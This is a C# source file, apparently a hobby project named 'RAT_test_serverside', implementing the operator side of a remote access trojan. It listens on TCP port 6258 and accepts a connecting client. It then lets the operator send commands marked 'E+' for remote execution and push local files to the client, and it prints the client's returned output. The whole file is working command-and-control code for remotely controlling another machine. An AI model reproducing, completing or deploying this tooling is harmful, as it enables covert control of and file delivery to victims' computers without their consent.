using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.IO;

namespace RAT_test_serverside
{
    class Program
    {
        private static string cmd;
        private static TcpListener listener;
        private static TcpClient client;

        private static bool keepAlive;

        static void Main(string[] args)
        {
            //Create the tcplistener and start it 
            listener = new TcpListener(6258);
            listener.Start();

            //Infinte loop that waits for connection and prints out the data
            while (true) {
                Console.WriteLine("Awaiting connection:");
                client = listener.AcceptTcpClient();

                //Create the streams
                StreamReader sr = new StreamReader(client.GetStream(),Encoding.ASCII);
                StreamWriter sw = new StreamWriter(client.GetStream(),Encoding.ASCII);

                try
                {
                    //Get the data and print it out
                    string data = sr.ReadLine();
                    Console.WriteLine("Connected to: " + data);
                    keepAlive = true;

                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                    keepAlive = false;
                }

                while (keepAlive)
                {
                    Console.WriteLine();
                    Console.WriteLine("Enter Command:");
                    cmd = Console.ReadLine();

                    if (cmd.StartsWith("E+"))
                    {
                        //Send data
                        try
                        {
                            Console.WriteLine("Sending: " + cmd);
                            sw.WriteLine(cmd);
                            sw.Flush();
                        }
                        catch (Exception e) { }
                    }

                    if (cmd.StartsWith("S"))
                    {
                        string[] sendArgs = cmd.Split(null);

                        FileStream fs = new FileStream(sendArgs[1], FileMode.Open, FileAccess.Read);
                        byte[] data = readToBytes(fs);

                        string dataString = string.Join("+", data);
                        Console.WriteLine("Sending File: " + sendArgs[1]);
                        sw.WriteLine("S_" + sendArgs[1] + "_" + dataString);
                        sw.Flush();

                        //Dispose everything
                        fs.Dispose();
                        dataString = String.Empty;
                        Array.Clear(data,0,data.Length);
                    }

                    //Get data
                    try
                    {
                        Console.WriteLine();
                        Console.WriteLine("OUTPUT:");

                        string data = String.Empty;
                        data = sr.ReadLine();
                        while (sr.Peek() != -1)
                        {
                            Console.WriteLine(data);
                            data = sr.ReadLine();
                        }
                    } catch(Exception e) { }
                }
                client.Close();
            }
        }

        public static byte[] readToBytes(Stream inputStream)
        {
            using (MemoryStream ms = new MemoryStream())
            {
                inputStream.CopyTo(ms);
                return ms.ToArray();
                ms.SetLength(0);
            }
        }

    }
}
